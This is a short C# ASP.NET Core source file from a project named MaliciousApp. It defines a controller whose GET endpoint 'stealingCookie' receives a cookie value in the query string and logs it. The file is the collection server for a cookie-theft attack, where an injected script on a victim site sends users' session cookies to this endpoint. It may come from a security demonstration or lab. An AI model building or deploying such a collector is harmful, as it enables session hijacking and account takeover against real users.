using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace MaliciousApp.Controllers
{
    public class StealingCookieController : Controller
    {
        private readonly ILogger<StealingCookieController> _logger;

        public StealingCookieController(ILogger<StealingCookieController> logger)
        {
            _logger = logger;
        }

        [HttpGet("stealingCookie")]
        public IActionResult Steal(string cookie)
        {
            _logger.LogInformation($"Received cookie: {cookie}");
            return Ok();
        }
    }
}
